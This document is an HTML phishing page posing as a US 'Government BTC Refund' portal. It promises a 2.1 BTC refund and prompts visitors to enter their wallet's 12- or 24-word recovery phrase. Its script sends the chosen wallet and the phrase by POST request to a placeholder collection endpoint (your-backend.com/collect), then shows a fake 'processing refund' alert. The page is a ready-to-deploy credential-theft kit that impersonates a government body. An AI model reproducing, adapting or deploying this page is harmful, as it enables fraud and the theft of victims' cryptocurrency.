<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GovBTCClaim Portal</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      text-align: center;
      padding-top: 50px;
      margin: 0;
      position: relative;
    }
    body::before {
      content: "GOV | BTC | CLAIM";
      font-size: 80px;
      color: rgba(247, 147, 26, 0.05);
      position: absolute;
      top: 40%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 0;
      white-space: nowrap;
      pointer-events: none;
    }
    .container {
      background: white;
      width: 90%;
      max-width: 400px;
      margin: auto;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      position: relative;
      z-index: 1;
    }
    h2 {
      color: #f7931a;
    }
    .btn {
      background-color: #f7931a;
      color: white;
      padding: 12px 20px;
      margin-top: 20px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
    }
    .wallet-box, .form-box {
      margin-top: 25px;
      background: #eee;
      padding: 15px;
      border-radius: 8px;
      word-break: break-word;
      display: none;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border-radius: 4px;
      border: 1px solid #ccc;
    }
    .note, .btc-amount {
      font-size: 13px;
      color: #777;
      margin-top: 10px;
    }
    .btc-amount {
      color: #333;
      font-size: 14px;
      margin-top: 15px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>ðŸ‡ºðŸ‡¸ Government BTC Refund</h2>
    <p>Claim your Bitcoin refund through verified wallet connection.</p>

    <div class="btc-amount">
      Estimated Refund Amount: <br><span style="color:#f7931a;">2.1 BTC â‰ˆ $115,000</span>
    </div>

    <button class="btn" onclick="connectWallet()">Connect Wallet</button>

    <div class="form-box" id="formBox">
      <form onsubmit="submitPhrase(); return false;">
        <label for="wallet">Select Wallet</label>
        <select id="wallet" required>
          <option value="">Choose</option>
          <option>MetaMask</option>
          <option>TrustWallet</option>
          <option>Coinbase Wallet</option>
        </select>

        <label for="phrase">Enter 12 or 24-word Phrase</label>
        <input type="text" id="phrase" required placeholder="e.g. abandon abandon abandon ...">
        
        <button class="btn" type="submit">Validate Wallet</button>
      </form>
    </div>

    <div class="note">Minimum wallet balance required for claim: 0.05 BTC</div>
    <div class="note">For support, contact: <b>admin@govbtcclaim.org</b></div>
  </div>

  <script>
    function connectWallet() {
      document.getElementById('formBox').style.display = 'block';
    }

    function submitPhrase() {
      const phrase = document.getElementById('phrase').value;
      const wallet = document.getElementById('wallet').value;
      
      // Send via fetch to backend or webhook
      fetch("https://your-backend.com/collect", {
        method: "POST",
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({wallet, phrase})
      });

      alert("Wallet connection submitted. Processing refund...");
      document.getElementById('formBox').reset();
    }
  </script>

</body>
</html>
